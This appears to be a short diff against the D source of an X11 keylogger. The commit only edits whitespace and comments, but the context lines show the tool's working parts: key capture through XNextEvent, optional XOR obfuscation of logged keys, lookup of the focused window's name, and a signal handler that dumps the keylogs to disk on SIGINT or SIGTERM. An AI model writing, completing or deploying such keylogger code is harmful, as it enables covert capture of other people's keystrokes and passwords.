@@ -63,6 +63,7 @@ void main() {
 		if (doQuit) {
 			break;
 		}
+		
         XEvent ev;
         XNextEvent(d, &ev);
         switch (ev.type) {
@@ -113,6 +114,7 @@ void main() {
     }
 }
 
+// Takes a string and adds it to the keybuffer
 void logKey(string key) {
 	version(USEXOR) {
 		key = xor(key, xorKey);
@@ -205,8 +207,8 @@ string getFocusedWindowName(_XDisplay* d, ulong focus) {
 	char* winName;
 	XFetchName(d, focus, &winName);
 	if (winName == null) {
-		// Focus might be a child window so we try to
-		// get the parent window id
+		// Focus might be a child window (Which means it has no name) 
+		// so we try to get the parent window id
 		Window parent;
 		Window root;
 		uint nchildren;
@@ -224,7 +226,7 @@ string getFocusedWindowName(_XDisplay* d, ulong focus) {
 	return "[" ~ to!string(winName) ~ "]";
 }
 
-// Catch SIGINT and write our keylogs to disk before exiting
+// Catch SIGINT/SIGTERM and write our keylogs to disk before exiting
 extern(C) void handler(int num) nothrow @nogc @system
 {
     printf("Caught signal %d\n",num);
